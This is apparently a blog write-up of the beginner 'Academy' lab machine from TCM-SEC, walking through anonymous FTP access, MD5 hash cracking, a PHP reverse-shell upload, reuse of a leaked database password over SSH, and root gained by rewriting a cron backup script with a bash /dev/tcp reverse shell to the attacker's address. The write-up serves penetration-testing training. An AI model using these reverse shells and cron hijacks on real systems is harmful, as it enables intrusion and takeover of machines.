---
title: "ACADEMY Machine Writeup - TCM-SEC Academy"
date: 2024-07-14T13:25:00+06:00
draft: false
tags: ["tcmsec", "hacking", "pentesting"]
categories: ["Write-ups"]
---

In this writeup, we will walk through the exploitation of the "Academy" machine from TCM-SEC Academy. This machine presents a range of common vulnerabilities, making it an excellent target for those honing their penetration testing skills. We will demonstrate how to enumerate services, crack passwords, exploit a file upload vulnerability, and ultimately achieve root access.

## Machine Information
```
Name: Academy
IP: 192.168.208.129
Difficulty: Beginner
```
## Scanning and Enumeration
### Nmap Scan
We begin with an Nmap scan to identify open ports and services.   

Command used:  
` sudo nmap -T4 -p- -A 192.168.208.128 `  

```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ nmap -T4 -A -p- 192.168.208.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 09:27 EDT
Nmap scan report for 192.168.208.129
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.208.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

#### Ports and Info
> 21/tcp open  ftp     vsftpd 3.0.3  
Anonymous FTP login allowed, note.txt  
> 22/tcp open  ssh     OpenSSH 7.9p1 Debian  
> 80/tcp open  http    Apache httpd 2.4.38  
Apache2 Debian Default Page: It works  
  

### Enumerating FTP
We discovered that anonymous login is allowed on the FTP service, so we proceeded to log in.
#### Anonymous Login

```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ ftp 192.168.208.129  
Connected to 192.168.208.129.
220 (vsFTPd 3.0.3)
Name (192.168.208.129:psychic): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Successfully logged in, we found a file named `note.txt`, which we downloaded and examined.

```shell
ftp> ls
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt

ftp> get note.txt

150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |***********************************|   776       98.16 KiB/s    00:00 ETA
226 Transfer complete.
ftp>     
```

```txt
┌──(psychic㉿0xShakhawat)-[~]
└─$ cat note.txt 
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

The note contained sensitive information, including a hashed password, which we proceeded to crack.

#### Cracking the Hash
The hash cd73502828457d15655bbd7a63fb0bc8 was identified as MD5, and we cracked it using Hashcat.  

```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

cd73502828457d15655bbd7a63fb0bc8:student

```
The cracked password was **`student`**.

### Enumerating HTTP
#### Directory Enumeration with FFUF
Next, we performed directory enumeration on the HTTP service using FFUF.  

```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.208.129/FUZZ
```

We found three directories: academy, phpmyadmin, and server-status.  

#### Exploring Academy
Inside the `academy` directory, we encountered a login page. Using the credentials found in `note.txt` (Reg No: 10201321, Password: student), we successfully logged in. After exploring the profile section, we found an option to upload an image, which we tested for file upload vulnerabilities.  

## Initial Access
We uploaded a PHP reverse shell using Pentestmonkey's script and configured a Netcat listener.  

### Netcat Listener Setup:
```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
```

### Uploading PHP Reverse Shell
Using Pentestmonkey's php reverse shell.

Chenging the ip and port.
```shell
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.208.139';  // CHANGE THIS
$port = 1234;       // CHANGE THIS

```
After uploading the file, it was automatically executed, granting us a shell.

### Getting Reverse Shell

After it executed we got the shell

```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [192.168.208.139] from (UNKNOWN) [192.168.208.129] 36288
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 15:11:20 up 2 days, 10:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
academy
$ sudo -l
/bin/sh: 3: sudo: not found
$ 
```
We got the www-data user shell, but We don't have sudo privilege access.

Now, escalate the privilege.

## Privilege Escalation
After gaining initial access, our next step was privilege escalation. We used `python3 -m http.server` to transfer Linpeas to the target machine. After making it executable with `chmod +x linpeas.sh`, we ran the script to gather system information.    

**Linpeas Output:**
```shell
crontab: * * * * * /home/grimmie/backup.sh

grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash
root:x:0:0:root:/root:/bin/bash

/usr/bin/gettext.sh 


/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";

```

**Config File Content:**

```shell
$ cat /var/www/html/academy/includes/config.php
<?php                                                                                                        
$mysql_hostname = "localhost";                                                                               
$mysql_user = "grimmie";                                                                                     
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                      
$mysql_database = "onlinecourse";                                                                            
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");

?>
$ 
```

We discovered that a user named `grimmie` was defined on the system and that a cron job was running a script called `backup.sh` every minute. Using the credentials found in the config file, we logged in via SSH as `grimmie`.    


**Let’s test ssh login with this password:**
```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ ssh grimmie@192.168.208.129
grimmie@academy:~$ whoami
grimmie
grimmie@academy:~$ hostname
academy
grimmie@academy:~$ sudo -l
-bash: sudo: command not found
grimmie@academy:~$ 

```
Although we didn't have `sudo` privileges, we had access to the `backup.sh` script running as root via cron. Here’s the script:   

```shell
grimmie@academy:~$ pwd
/home/grimmie
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

To escalate privileges, we set up a Netcat listener and modified the `backup.sh` script to include a reverse shell payload:  

```shell
#!/bin/bash
bash -i >& /dev/tcp/192.168.208.139/8081 0>&1
```
Within a minute, the cron job executed the modified script, and we gained root access!  

```shell
┌──(psychic㉿0xShakhawat)-[~]
└─$ nc -lvnp 8081 
listening on [any] 8081 ...
connect to [192.168.208.139] from (UNKNOWN) [192.168.208.129] 34586
bash: cannot set terminal process group (6836): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~# whoami
root
root@academy:~# cd /root
root@academy:~# ls
flag.txt
root@academy:~# cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
root@academy:~# 
```
We successfully rooted the Academy machine by exploiting various vulnerabilities, including FTP anonymous login, MD5 hash cracking, and file upload vulnerabilities. This machine provided a great opportunity to practice essential penetration testing techniques.  